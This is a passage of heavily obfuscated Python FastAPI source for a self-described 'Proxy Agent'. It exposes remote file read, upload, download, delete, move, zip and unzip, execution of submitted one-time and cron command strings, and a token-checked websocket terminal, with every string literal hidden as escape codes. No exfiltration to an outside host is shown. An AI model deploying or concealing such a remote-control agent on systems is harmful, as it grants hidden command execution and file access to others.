        return JSONResponse(status_code=400, content={codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): codecs.decode('', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074', 'unicode_escape'): codecs.decode('', 'unicode_escape'), codecs.decode('\\u0065\\u006e\\u0063\\u006f\\u0064\\u0069\\u006e\\u0067', 'unicode_escape'): codecs.decode('', 'unicode_escape'), codecs.decode('\\u0069\\u0073\\u005f\\u0062\\u0069\\u006e\\u0061\\u0072\\u0079', 'unicode_escape'): False, codecs.decode('\\u0073\\u0069\\u007a\\u0065', 'unicode_escape'): 0})
    O0_var_2058 = request.app.state.file_manager
    O0_var_2059 = O0_var_2058.cat_file(body.path)
    return O0_var_2059

@app.post(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0066\\u0069\\u006c\\u0065', 'unicode_escape'), response_model=FileUploadResponse)
async def O0_fn_84(request: Request, body: FileUploadRequest=Body(...)):
    if not body.content:
        return JSONResponse(status_code=400, content={codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u0020\\u0028\\u0062\\u0061\\u0073\\u0065\\u0036\\u0034\\u0029\\u0020\\u0072\\u0065\\u0071\\u0075\\u0069\\u0072\\u0065\\u0064', 'unicode_escape'), codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): None, codecs.decode('\\u0072\\u0065\\u0063\\u0065\\u0069\\u0076\\u0065\\u0064', 'unicode_escape'): None, codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): None, codecs.decode('\\u0063\\u0068\\u0075\\u006e\\u006b\\u0065\\u0064', 'unicode_escape'): None})
    try:
        O0_var_2060 = base64.b64decode(body.content)
    except Exception:
        return JSONResponse(status_code=400, content={codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0049\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u0020\\u0062\\u0061\\u0073\\u0065\\u0036\\u0034\\u0020\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074', 'unicode_escape'), codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): None, codecs.decode('\\u0072\\u0065\\u0063\\u0065\\u0069\\u0076\\u0065\\u0064', 'unicode_escape'): None, codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): None, codecs.decode('\\u0063\\u0068\\u0075\\u006e\\u006b\\u0065\\u0064', 'unicode_escape'): None})
    O0_var_2061 = request.app.state.file_manager
    O0_var_2062 = O0_var_2061.upload_file(file_content=O0_var_2060, target_path=body.path, filename=body.filename, chunk_id=body.chunk_id, total_chunks=body.total_chunks)
    return O0_var_2062

@app.post(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0066\\u0069\\u006c\\u0065\\u0072\\u0061\\u0077', 'unicode_escape'), response_model=FileUploadRawResponse)
async def O0_fn_85(request: Request):
    O0_var_2063 = request.headers
    O0_var_2064 = unquote(O0_var_2063.get(codecs.decode('\\u0058\\u002d\\u0046\\u0069\\u006c\\u0065\\u002d\\u0050\\u0061\\u0074\\u0068', 'unicode_escape'), codecs.decode('', 'unicode_escape')))
    O0_var_2065 = unquote(O0_var_2063.get(codecs.decode('\\u0058\\u002d\\u0046\\u0069\\u006c\\u0065\\u002d\\u004e\\u0061\\u006d\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')))
    O0_var_2066 = O0_var_2063.get(codecs.decode('\\u0058\\u002d\\u0043\\u0068\\u0075\\u006e\\u006b\\u002d\\u0049\\u0064', 'unicode_escape'))
    O0_var_2067 = O0_var_2063.get(codecs.decode('\\u0058\\u002d\\u0054\\u006f\\u0074\\u0061\\u006c\\u002d\\u0043\\u0068\\u0075\\u006e\\u006b\\u0073', 'unicode_escape'))
    if not O0_var_2064 or not O0_var_2065:
        raise HTTPException(status_code=status.HTTP_400_BAD_REQUEST, detail=codecs.decode('\\u004d\\u0069\\u0073\\u0073\\u0069\\u006e\\u0067\\u0020\\u0072\\u0065\\u0071\\u0075\\u0069\\u0072\\u0065\\u0064\\u0020\\u0063\\u0075\\u0073\\u0074\\u006f\\u006d\\u0020\\u0068\\u0065\\u0061\\u0064\\u0065\\u0072\\u0073\\u003a\\u0020\\u0058\\u002d\\u0046\\u0069\\u006c\\u0065\\u002d\\u0050\\u0061\\u0074\\u0068\\u0020\\u0061\\u006e\\u0064\\u0020\\u0058\\u002d\\u0046\\u0069\\u006c\\u0065\\u002d\\u004e\\u0061\\u006d\\u0065', 'unicode_escape'))
    O0_var_2068 = int(O0_var_2066) if O0_var_2066 is not None else None
    O0_var_2069 = int(O0_var_2067) if O0_var_2067 is not None else None
    O0_var_2070 = await request.body()
    O0_var_2071 = request.app.state.file_manager
    O0_var_2072 = O0_var_2071.upload_file(file_content=O0_var_2070, target_path=O0_var_2064, filename=O0_var_2065, chunk_id=O0_var_2068, total_chunks=O0_var_2069)
    if O0_var_2072.get(codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape')) == codecs.decode('\\u006f\\u006b', 'unicode_escape'):
        return FileUploadRawResponse(status=codecs.decode('\\u006f\\u006b', 'unicode_escape'), path=O0_var_2072.get(codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape')), chunk_id=O0_var_2068, completed=True, message=codecs.decode('\\u0041\\u006c\\u006c\\u0020\\u0063\\u0068\\u0075\\u006e\\u006b\\u0073\\u0020\\u0072\\u0065\\u0063\\u0065\\u0069\\u0076\\u0065\\u0064\\u002e\\u0020\\u0046\\u0069\\u006c\\u0065\\u0020\\u006d\\u0065\\u0072\\u0067\\u0065\\u0064\\u0020\\u0073\\u0075\\u0063\\u0063\\u0065\\u0073\\u0073\\u0066\\u0075\\u006c\\u006c\\u0079\\u002e', 'unicode_escape') if O0_var_2072.get(codecs.decode('\\u0063\\u0068\\u0075\\u006e\\u006b\\u0065\\u0064', 'unicode_escape')) else codecs.decode('\\u0046\\u0069\\u006c\\u0065\\u0020\\u0075\\u0070\\u006c\\u006f\\u0061\\u0064\\u0065\\u0064\\u0020\\u0073\\u0075\\u0063\\u0063\\u0065\\u0073\\u0073\\u0066\\u0075\\u006c\\u006c\\u0079\\u002e', 'unicode_escape'))
    elif O0_var_2072.get(codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape')) == codecs.decode('\\u0070\\u0065\\u006e\\u0064\\u0069\\u006e\\u0067', 'unicode_escape'):
        return FileUploadRawResponse(status=codecs.decode('\\u006f\\u006b', 'unicode_escape'), path=os.path.join(O0_var_2064, O0_var_2065), chunk_id=O0_var_2068, completed=False, message=codecs.decode('\\u0043\\u0068\\u0075\\u006e\\u006b\\u0020', 'unicode_escape') + str(O0_var_2068) + codecs.decode('\\u0020\\u0075\\u0070\\u006c\\u006f\\u0061\\u0064\\u0065\\u0064\\u002e\\u0020\\u0057\\u0061\\u0069\\u0074\\u0069\\u006e\\u0067\\u0020\\u0066\\u006f\\u0072\\u0020\\u0072\\u0065\\u006d\\u0061\\u0069\\u006e\\u0069\\u006e\\u0067\\u0020\\u0062\\u006c\\u006f\\u0063\\u006b\\u0073\\u002e', 'unicode_escape'))
    return FileUploadRawResponse(status=codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), completed=False, message=O0_var_2072.get(codecs.decode('\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065', 'unicode_escape'), codecs.decode('\\u0055\\u006e\\u006b\\u006e\\u006f\\u0077\\u006e\\u0020\\u0075\\u0070\\u006c\\u006f\\u0061\\u0064\\u0020\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape')))

@app.post(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0066\\u0069\\u006c\\u0065\\u002f\\u0064\\u006f\\u0077\\u006e\\u006c\\u006f\\u0061\\u0064', 'unicode_escape'))
async def O0_fn_86(request: Request, body: FileDownloadRequest=Body(...)):
    if not body.path:
        return JSONResponse(400, {codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u0070\\u0061\\u0074\\u0068\\u0020\\u0072\\u0065\\u0071\\u0075\\u0069\\u0072\\u0065\\u0064', 'unicode_escape')})
    O0_var_2073 = request.app.state.file_manager
    O0_var_2074, O0_var_2075, O0_var_2076 = O0_var_2073.download_file(body.path)
    if not Config.DEBUG and request.headers.get(codecs.decode('\\u0078\\u002d\\u0064\\u006c\\u002d\\u0065\\u006e\\u0063', 'unicode_escape')) == codecs.decode('\\u0031', 'unicode_escape') and (0 < Config.DOWNLOAD_ENCRYPT_MAX) and (O0_var_2076 <= Config.DOWNLOAD_ENCRYPT_MAX):
        try:
            O0_var_2077 = CryptoManager.encrypt_data(O0_var_2074.read_bytes(), Config._raw_key)
        except Exception as exc:
            raise HTTPException(status_code=500, detail=codecs.decode('\\u0044\\u006f\\u0077\\u006e\\u006c\\u006f\\u0061\\u0064\\u0020\\u0065\\u006e\\u0063\\u0072\\u0079\\u0070\\u0074\\u0069\\u006f\\u006e\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064', 'unicode_escape')) from exc
        return Response(content=O0_var_2077, media_type=codecs.decode('\\u0061\\u0070\\u0070\\u006c\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u002f\\u006f\\u0063\\u0074\\u0065\\u0074\\u002d\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d', 'unicode_escape'), headers={codecs.decode('\\u0078\\u002d\\u0065\\u006e\\u0063\\u0072\\u0079\\u0070\\u0074\\u0065\\u0064', 'unicode_escape'): codecs.decode('\\u0074\\u0072\\u0075\\u0065', 'unicode_escape'), codecs.decode('\\u0078\\u002d\\u0066\\u0069\\u006c\\u0065\\u002d\\u0073\\u0069\\u007a\\u0065', 'unicode_escape'): str(O0_var_2076), codecs.decode('\\u0078\\u002d\\u006f\\u0072\\u0069\\u0067\\u0069\\u006e\\u0061\\u006c\\u002d\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): str(O0_var_2074.relative_to(Path(Config.FILE_ROOT)))})
    from fastapi.responses import FileResponse
    return FileResponse(path=str(O0_var_2074), filename=O0_var_2074.name, media_type=O0_var_2075, headers={codecs.decode('\\u0078\\u002d\\u0066\\u0069\\u006c\\u0065\\u002d\\u0073\\u0069\\u007a\\u0065', 'unicode_escape'): str(O0_var_2076), codecs.decode('\\u0078\\u002d\\u006f\\u0072\\u0069\\u0067\\u0069\\u006e\\u0061\\u006c\\u002d\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): str(O0_var_2074.relative_to(Path(Config.FILE_ROOT)))})

@app.delete(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0066\\u0069\\u006c\\u0065', 'unicode_escape'), response_model=FileDeleteResponse)
async def O0_fn_87(request: Request, body: FileDeleteRequest=Body(...)):
    O0_var_2078 = body.paths
    if not O0_var_2078:
        O0_var_2079 = await request.body()
        O0_var_2080 = json.loads(O0_var_2079.decode()) if O0_var_2079 else {}
        O0_var_2078 = [O0_var_2082 for O0_var_2081 in [codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'), codecs.decode('\\u0070\\u0061\\u0074\\u0068\\u0032', 'unicode_escape'), codecs.decode('\\u0070\\u0031', 'unicode_escape'), codecs.decode('\\u0070\\u0032', 'unicode_escape')] if (O0_var_2082 := O0_var_2080.get(O0_var_2081))]
    if not O0_var_2078:
        return JSONResponse(status_code=400, content={codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0072\\u0065\\u0073\\u0075\\u006c\\u0074\\u0073', 'unicode_escape'): []})
    O0_var_2083 = request.app.state.file_manager
    O0_var_2084 = O0_var_2083.delete_paths(O0_var_2078)
    return O0_var_2084

@app.put(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0066\\u0069\\u006c\\u0065', 'unicode_escape'), response_model=FileMoveResponse, response_model_exclude_none=True)
async def O0_fn_88(request: Request, move_map: Dict[str, str]=Body(..., examples={codecs.decode('\\u002f\\u0074\\u006d\\u0070\\u002f\\u006f\\u006c\\u0064\\u002e\\u0074\\u0078\\u0074', 'unicode_escape'): codecs.decode('\\u002f\\u0061\\u0072\\u0063\\u0068\\u0069\\u0076\\u0065\\u002f\\u006f\\u006c\\u0064\\u002e\\u0074\\u0078\\u0074', 'unicode_escape')})):
    O0_var_2085 = request.app.state.file_manager
    O0_var_2086 = O0_var_2085.move_paths(move_map)
    return O0_var_2086

@app.post(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0066\\u0069\\u006c\\u0065\\u002f\\u0063\\u0070', 'unicode_escape'), response_model=FileMoveResponse, response_model_exclude_none=True)
async def O0_fn_89(request: Request, copy_map: Dict[str, str]=Body(..., description=codecs.decode('\\u6e90\\u8def\\u5f84\\u5230\\u76ee\\u6807\\u8def\\u5f84\\u7684\\u6620\\u5c04', 'unicode_escape'), examples=[{codecs.decode('\\u002f\\u0074\\u006d\\u0070\\u002f\\u006f\\u006c\\u0064\\u002e\\u0074\\u0078\\u0074', 'unicode_escape'): codecs.decode('\\u002f\\u0061\\u0072\\u0063\\u0068\\u0069\\u0076\\u0065\\u002f\\u006f\\u006c\\u0064\\u002e\\u0074\\u0078\\u0074', 'unicode_escape'), codecs.decode('\\u002f\\u0074\\u006d\\u0070\\u002f\\u006c\\u006f\\u0067\\u0073', 'unicode_escape'): codecs.decode('\\u002f\\u0062\\u0061\\u0063\\u006b\\u0075\\u0070\\u002f\\u006c\\u006f\\u0067\\u0073', 'unicode_escape')}])):
    O0_var_2087 = request.app.state.file_manager
    O0_var_2088 = O0_var_2087.copy_paths(copy_map)
    return O0_var_2088

@app.post(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0066\\u0069\\u006c\\u0065\\u002f\\u006e\\u0065\\u0077', 'unicode_escape'), response_model=FileMkdirResponse)
async def O0_fn_90(request: Request, body: FileMkdirRequest=Body(...)):
    if not body.path:
        return JSONResponse(status_code=400, content={codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0070\\u0061\\u0074\\u0068\\u0020\\u0072\\u0065\\u0071\\u0075\\u0069\\u0072\\u0065\\u0064', 'unicode_escape'), codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): codecs.decode('', 'unicode_escape')})
    O0_var_2089 = request.app.state.file_manager
    O0_var_2090 = O0_var_2089.create_directory(body.path)
    return O0_var_2090

@app.post(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0066\\u0069\\u006c\\u0065\\u002f\\u007a\\u0069\\u0070', 'unicode_escape'), response_model=FileZipResponse, response_model_exclude_none=True)
async def O0_fn_91(request: Request, body: FileZipRequest=Body(...)):
    if not body.path:
        return JSONResponse(status_code=400, content={codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u0070\\u0061\\u0074\\u0068\\u0020\\u0072\\u0065\\u0071\\u0075\\u0069\\u0072\\u0065\\u0064', 'unicode_escape')})
    if not body.items or not isinstance(body.items, list):
        return JSONResponse(status_code=400, content={codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u0069\\u0074\\u0065\\u006d\\u0073\\u0020\\u0072\\u0065\\u0071\\u0075\\u0069\\u0072\\u0065\\u0064\\u0020\\u0028\\u006e\\u006f\\u006e\\u002d\\u0065\\u006d\\u0070\\u0074\\u0079\\u0020\\u0061\\u0072\\u0072\\u0061\\u0079\\u0029', 'unicode_escape')})
    O0_var_2091 = request.app.state.file_manager
    O0_var_2092 = O0_var_2091.zip_items(body.path, body.items, flat=bool(body.flat))
    return O0_var_2092

@app.post(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0066\\u0069\\u006c\\u0065\\u002f\\u0075\\u006e\\u007a\\u0069\\u0070', 'unicode_escape'), response_model=FileUnzipResponse)
async def O0_fn_92(request: Request, body: FileUnzipRequest=Body(...)):
    if not body.path:
        return JSONResponse(status_code=400, content={codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u0070\\u0061\\u0074\\u0068\\u0020\\u0072\\u0065\\u0071\\u0075\\u0069\\u0072\\u0065\\u0064', 'unicode_escape')})
    O0_var_2093 = request.app.state.file_manager
    O0_var_2094 = O0_var_2093.unzip_archive(body.path, dest_path=body.dest_path, overwrite=bool(body.overwrite), entries=body.entries)
    return O0_var_2094

@app.get(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0074\\u0061\\u0073\\u006b\\u002f\\u006f\\u006e\\u0065\\u0074\\u0069\\u006d\\u0065', 'unicode_escape'), response_model=OneTimeTaskGetResponse)
async def O0_fn_93(request: Request):
    O0_var_2095 = request.app.state.task_manager.get_onetime_tasks()
    return O0_var_2095

@app.post(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0074\\u0061\\u0073\\u006b\\u002f\\u006f\\u006e\\u0065\\u0074\\u0069\\u006d\\u0065', 'unicode_escape'), response_model=OneTimeTaskResponse)
async def O0_fn_94(request: Request, tasks: List[str]=Body(default=[])):
    O0_var_2096 = request.app.state.task_manager.set_onetime_tasks(tasks)
    O0_var_2097 = {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u0075\\u006e\\u0074', 'unicode_escape'): len(tasks), codecs.decode('\\u0074\\u0061\\u0073\\u006b\\u0073', 'unicode_escape'): tasks, codecs.decode('\\u0070\\u0065\\u0072\\u0073\\u0069\\u0073\\u0074\\u0065\\u0064', 'unicode_escape'): O0_var_2096.get(codecs.decode('\\u0070\\u0065\\u0072\\u0073\\u0069\\u0073\\u0074\\u0065\\u0064', 'unicode_escape'), False)}
    if Config.InitTask and tasks:
        O0_var_2097[codecs.decode('\\u0065\\u0078\\u0065\\u0063\\u0075\\u0074\\u0065\\u0064', 'unicode_escape')] = await asyncio.to_thread(request.app.state.task_manager.run_onetime_tasks)
    return O0_var_2097

@app.get(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0074\\u0061\\u0073\\u006b\\u002f\\u0063\\u0072\\u006f\\u006e', 'unicode_escape'), response_model=CronTasksResponse)
async def O0_fn_95(request: Request):
    O0_var_2098 = request.app.state.task_manager.get_cron_tasks()
    return O0_var_2098

@app.post(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0074\\u0061\\u0073\\u006b\\u002f\\u0063\\u0072\\u006f\\u006e', 'unicode_escape'), response_model=CronTasksResponse)
async def O0_fn_96(request: Request, tasks: Dict[str, str]=Body(default={}, examples=[{codecs.decode('\\u002a\\u002f\\u0031\\u0030\\u0020\\u002a\\u0020\\u002a\\u0020\\u002a\\u0020\\u002a', 'unicode_escape'): codecs.decode('\\u0070\\u0079\\u0074\\u0068\\u006f\\u006e\\u0020\\u002f\\u006f\\u0070\\u0074\\u002f\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u0073\\u002f\\u0068\\u0065\\u0061\\u006c\\u0074\\u0068\\u005f\\u0063\\u0068\\u0065\\u0063\\u006b\\u002e\\u0070\\u0079', 'unicode_escape'), codecs.decode('\\u0030\\u0020\\u0030\\u0020\\u002a\\u0020\\u002a\\u0020\\u0030', 'unicode_escape'): codecs.decode('\\u002f\\u006f\\u0070\\u0074\\u002f\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u0073\\u002f\\u0077\\u0065\\u0065\\u006b\\u006c\\u0079\\u005f\\u0072\\u0065\\u0070\\u006f\\u0072\\u0074\\u002e\\u0073\\u0068', 'unicode_escape')}])):
    O0_var_2099 = request.app.state.task_manager.set_cron_tasks(tasks)
    return O0_var_2099

@app.get(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0074\\u0061\\u0073\\u006b\\u002f\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'), response_model=TaskStatusResponse)
async def O0_fn_97(request: Request):
    return request.app.state.task_manager.get_status()

@app.post(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0074\\u0061\\u0073\\u006b\\u002f\\u006f\\u006e\\u0065\\u0074\\u0069\\u006d\\u0065\\u002f\\u0065\\u0078\\u0065\\u0063\\u0075\\u0074\\u0065', 'unicode_escape'), response_model=OnetimeExecuteResponse)
async def O0_fn_98(request: Request):
    if not Config.onetasks:
        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065', 'unicode_escape'): codecs.decode('\\u004e\\u006f\\u0020\\u0074\\u0061\\u0073\\u006b\\u0073\\u0020\\u0074\\u006f\\u0020\\u0065\\u0078\\u0065\\u0063\\u0075\\u0074\\u0065', 'unicode_escape'), codecs.decode('\\u0065\\u0078\\u0065\\u0063\\u0075\\u0074\\u0065\\u0064', 'unicode_escape'): 0, codecs.decode('\\u0072\\u0065\\u0073\\u0075\\u006c\\u0074\\u0073', 'unicode_escape'): []}
    Config.InitTask = True
    O0_var_2100 = await asyncio.to_thread(request.app.state.task_manager.run_onetime_tasks)
    return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0065\\u0078\\u0065\\u0063\\u0075\\u0074\\u0065\\u0064', 'unicode_escape'): len(O0_var_2100), codecs.decode('\\u0072\\u0065\\u0073\\u0075\\u006c\\u0074\\u0073', 'unicode_escape'): O0_var_2100}

@app.get(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0074\\u0061\\u0073\\u006b\\u002f\\u006c\\u006f\\u0067\\u002f\\u006f\\u006e\\u0065\\u0074\\u0069\\u006d\\u0065', 'unicode_escape'), response_model=TaskLogResponse)
async def O0_fn_99(request: Request, limit: int=Query(100, ge=1, le=100)):
    O0_var_2101 = request.app.state.task_manager.get_onetime_log(limit)
    return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u0075\\u006e\\u0074', 'unicode_escape'): len(O0_var_2101), codecs.decode('\\u006c\\u006f\\u0067\\u0073', 'unicode_escape'): list(O0_var_2101)}

@app.get(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0074\\u0061\\u0073\\u006b\\u002f\\u006c\\u006f\\u0067\\u002f\\u0063\\u0072\\u006f\\u006e', 'unicode_escape'), response_model=TaskLogResponse)
async def O0_fn_100(request: Request, limit: int=Query(100, ge=1, le=100)):
    O0_var_2102 = request.app.state.task_manager.get_cron_log(limit)
    return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u0075\\u006e\\u0074', 'unicode_escape'): len(O0_var_2102), codecs.decode('\\u006c\\u006f\\u0067\\u0073', 'unicode_escape'): list(O0_var_2102)}

@app.delete(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0074\\u0061\\u0073\\u006b\\u002f\\u006c\\u006f\\u0067\\u002f\\u006f\\u006e\\u0065\\u0074\\u0069\\u006d\\u0065', 'unicode_escape'), response_model=LogClearResponse)
async def O0_fn_101(request: Request):
    return request.app.state.task_manager.clear_logs(codecs.decode('\\u006f\\u006e\\u0065\\u0074\\u0069\\u006d\\u0065', 'unicode_escape'))

@app.delete(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0074\\u0061\\u0073\\u006b\\u002f\\u006c\\u006f\\u0067\\u002f\\u0063\\u0072\\u006f\\u006e', 'unicode_escape'), response_model=LogClearResponse)
async def O0_fn_102(request: Request):
    return request.app.state.task_manager.clear_logs(codecs.decode('\\u0063\\u0072\\u006f\\u006e', 'unicode_escape'))

@app.get(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0074\\u0061\\u0073\\u006b\\u002f\\u006c\\u006f\\u0067\\u002f\\u0073\\u0075\\u006d\\u006d\\u0061\\u0072\\u0079', 'unicode_escape'), response_model=LogSummaryResponse)
async def O0_fn_103(request: Request):

    def O0_fn_104(O0_var_2103):
        O0_var_2104 = list(O0_var_2103)[-10:]
        return {codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c\\u005f\\u006c\\u006f\\u0067\\u0067\\u0065\\u0064', 'unicode_escape'): len(O0_var_2103), codecs.decode('\\u006d\\u0061\\u0078\\u005f\\u0063\\u0061\\u0070\\u0061\\u0063\\u0069\\u0074\\u0079', 'unicode_escape'): Config.MAX_TASK_LOG_SIZE, codecs.decode('\\u0072\\u0065\\u0063\\u0065\\u006e\\u0074\\u005f\\u0073\\u0075\\u0063\\u0063\\u0065\\u0073\\u0073', 'unicode_escape'): sum((1 for O0_var_2105 in O0_var_2104 if O0_var_2105.get(codecs.decode('\\u0065\\u0078\\u0069\\u0074\\u0063\\u006f\\u0064\\u0065', 'unicode_escape')) == 0)), codecs.decode('\\u0072\\u0065\\u0063\\u0065\\u006e\\u0074\\u005f\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064', 'unicode_escape'): sum((1 for O0_var_2106 in O0_var_2104 if O0_var_2106.get(codecs.decode('\\u0065\\u0078\\u0069\\u0074\\u0063\\u006f\\u0064\\u0065', 'unicode_escape'), -1) != 0))}
    return {codecs.decode('\\u006f\\u006e\\u0065\\u0074\\u0069\\u006d\\u0065', 'unicode_escape'): O0_fn_104(Config.onetimetasks_log), codecs.decode('\\u0063\\u0072\\u006f\\u006e', 'unicode_escape'): O0_fn_104(Config.crontasks_log)}

@app.get(codecs.decode('\\u002f\\u0068\\u0065\\u0061\\u006c\\u0074\\u0068', 'unicode_escape'))
async def O0_fn_105():
    return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0064\\u0065\\u0062\\u0075\\u0067', 'unicode_escape'): Config.DEBUG, codecs.decode('\\u0074\\u0069\\u006d\\u0065\\u0073\\u0074\\u0061\\u006d\\u0070', 'unicode_escape'): int(time.time()), codecs.decode('\\u0076\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e', 'unicode_escape'): Config.AGENT_VERSION}

@app.get(codecs.decode('\\u002f', 'unicode_escape'))
async def O0_fn_106():
    return {codecs.decode('\\u006e\\u0061\\u006d\\u0065', 'unicode_escape'): codecs.decode('\\u0050\\u0072\\u006f\\u0078\\u0079\\u0020\\u0041\\u0067\\u0065\\u006e\\u0074', 'unicode_escape'), codecs.decode('\\u0076\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e', 'unicode_escape'): Config.AGENT_VERSION, codecs.decode('\\u0065\\u006e\\u0064\\u0070\\u006f\\u0069\\u006e\\u0074\\u0073', 'unicode_escape'): {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'), codecs.decode('\\u0068\\u0065\\u0061\\u006c\\u0074\\u0068', 'unicode_escape'): codecs.decode('\\u002f\\u0068\\u0065\\u0061\\u006c\\u0074\\u0068', 'unicode_escape'), codecs.decode('\\u0064\\u006f\\u0063\\u0073', 'unicode_escape'): codecs.decode('\\u002f\\u0064\\u006f\\u0063\\u0073\\u0020\\u0028\\u4ec5\\u0044\\u0045\\u0042\\u0055\\u0047\\u6a21\\u5f0f\\u0029', 'unicode_escape')}}

@app.websocket(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0077\\u0073\\u002f\\u007b\\u0070\\u0061\\u0074\\u0068\\u003a\\u0070\\u0061\\u0074\\u0068\\u007d', 'unicode_escape'))
async def O0_fn_107(websocket: WebSocket, path: str, request_id: str=Query(...), token: str=Query(None), meta: str=Query(None), incognito: str=Query(None)):
    O0_var_2107 = TerminalSessionHandler()
    O0_var_2108 = True
    if token is not None:
        O0_var_2108 = False
        O0_var_2109 = Config.ws_downgrade_token()
        if not hmac.compare_digest(token.encode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape')), O0_var_2109.encode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'))):
            await websocket.close(code=1008, reason=codecs.decode('\\u0041\\u0075\\u0074\\u0068\\u0065\\u006e\\u0074\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020\\u0049\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u0020\\u0054\\u006f\\u006b\\u0065\\u006e', 'unicode_escape'))
